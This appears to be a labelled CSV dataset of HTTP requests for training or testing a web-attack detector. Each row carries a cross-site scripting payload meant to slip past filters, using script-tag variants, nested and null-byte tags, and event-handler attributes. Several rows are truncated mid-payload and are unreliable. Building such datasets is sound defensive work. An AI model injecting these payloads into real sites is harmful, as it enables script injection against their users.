method,url,uri,query,headers,body,type
POST,/example,/example,"p1=""><script>console.log(299792458)</script>&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>confirm(299792458)</script>&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>prompt(299792458)</script>&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>alert(299792458)</script><""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>console.log(299792458)</script><""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>confirm(299792458)</script><""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>prompt(299792458)</script><""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>alert(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>console.log(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>confirm(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>prompt(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>alert(299792458)</script><'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>console.log(299792458)</script><'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>confirm(299792458)</script><'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>prompt(299792458)</script><'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRIPT>alert(299792458);</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRIPT>console.log(299792458);</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRIPT>confirm(299792458);</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRIPT>prompt(299792458);</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<script>pt>alert(299792458);</scr</script>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<script>pt>console.log(299792458);</scr</script>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<script>pt>confirm(299792458);</scr</script>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<script>pt>prompt(299792458);</scr</script>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRI<script>PT>alert(299792458);</SCR</script>IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRI<script>PT>console.log(299792458);</SCR</script>IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRI<script>PT>confirm(299792458);</SCR</script>IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRI<script>PT>prompt(299792458);</SCR</script>IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<scr<script>ipt>pt>alert(299792458);</scr</sc</script>ript>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<scr<script>ipt>pt>console.log(299792458);</scr</sc</script>ript>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<scr<script>ipt>pt>confirm(299792458);</scr</sc</script>ript>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<scr<script>ipt>pt>prompt(299792458);</scr</sc</script>ript>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1="";alert(299792458);""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1="";console.log(299792458);""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1="";confirm(299792458);""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1="";prompt(299792458);""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=';alert(299792458);'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=';console.log(299792458);'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=';confirm(299792458);'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=';prompt(299792458);'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=;alert(299792458);&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=;console.log(299792458);&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=;confirm(299792458);&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=;prompt(299792458);&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=alert(299792458);&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=console.log(299792458);&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=confirm(299792458);&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=prompt(299792458);&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCR%00IPT>alert(299792458)</SCR%00IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCR%00IPT>console.log(299792458)</SCR%00IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCR%00IPT>confirm(299792458)</SCR%00IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCR%00IPT>prompt(299792458)</SCR%00IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=\"";alert(299792458);//&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=\"";console.log(299792458);//&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=\"";confirm(299792458);//&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=\"";prompt(299792458);//&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<STYLE,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<STYLE,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<STYLE,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<STYLE,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<<SCRIPT>alert(299792458)//<</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<<SCRIPT>console.log(299792458)//<</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<<SCRIPT>confirm(299792458)//<</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<<SCRIPT>prompt(299792458)//<</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmousemove=alert(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmouseout=alert(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmouseover=alert(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmousemove=console.log(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmouseout=console.log(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmouseover=console.log(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmousemove=confirm(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmouseout=confirm(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmouseover=confirm(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmousemove=prompt(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmouseout=prompt(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""onmouseover=prompt(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<<SCRIPT>alert(299792458)//<</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<<SCRIPT>console.log(299792458)//<</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<<SCRIPT>confirm(299792458)//<</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<<SCRIPT>prompt(299792458)//<</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=onerror=""alert(299792458)""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=onerror=""console.log(299792458)""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=onerror=""confirm(299792458)""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=onerror=""prompt(299792458)""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=onerror='alert(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=onerror='console.log(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=onerror='confirm(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=onerror='prompt(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=onload=""alert(299792458)""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=onload=""console.log(299792458)""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=onload=""confirm(299792458)""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=onload=""prompt(299792458)""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=onload='alert(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=onload='console.log(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=onload='confirm(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=onload='prompt(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""""""><SCRIPT>alert(299792458)&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""""""><SCRIPT>console.log(299792458)&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""""""><SCRIPT>confirm(299792458)&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""""""><SCRIPT>prompt(299792458)&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='''><SCRIPT>alert(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='''><SCRIPT>console.log(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='''><SCRIPT>confirm(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='''><SCRIPT>prompt(299792458)'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<script>alert(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<script>console.log(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<script>confirm(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<script>prompt(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scr,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scr,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scr,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scr,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>alert(299792458)</script>","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>console.log(299792458)</script>","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>confirm(299792458)</script>","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>prompt(299792458)</script>","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>alert(299792458)</script><""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>console.log(299792458)</script><""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>confirm(299792458)</script><""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>prompt(299792458)</script><""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>alert(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>console.log(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>confirm(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
